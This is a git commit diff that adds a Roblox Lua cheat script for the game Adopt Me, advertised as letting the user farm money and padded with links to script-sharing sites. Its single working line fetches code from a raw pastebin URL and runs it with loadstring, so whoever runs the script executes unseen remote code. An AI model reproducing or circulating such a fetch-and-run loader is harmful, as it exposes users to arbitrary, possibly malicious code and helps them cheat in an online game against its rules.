abb8007a2ce26807a9d7a07a11bcd3a2d1ff2081
PapaJoeX <jaouad.kassaoui@gmail.com>
2022-12-28 02:53:18 +0100

    commit zero

---
+++ LINK GAME Script pastebin roblox Adopt Me .lua
@@ -0,0 +1,11 @@
+-- find more powerfull verified and New Scripts here : https://script-pastebin.com
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Z3iAXASr", true))()  game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Rbxscripts.com"; Text = "Loaded"; Duration = 15; })
+
+-- find more powerfull verified and New Scripts here : https://scriptpastebin.io
+
+--[[ Script Description:
+
+							With this script you will be able to farm money!
+						
+]]
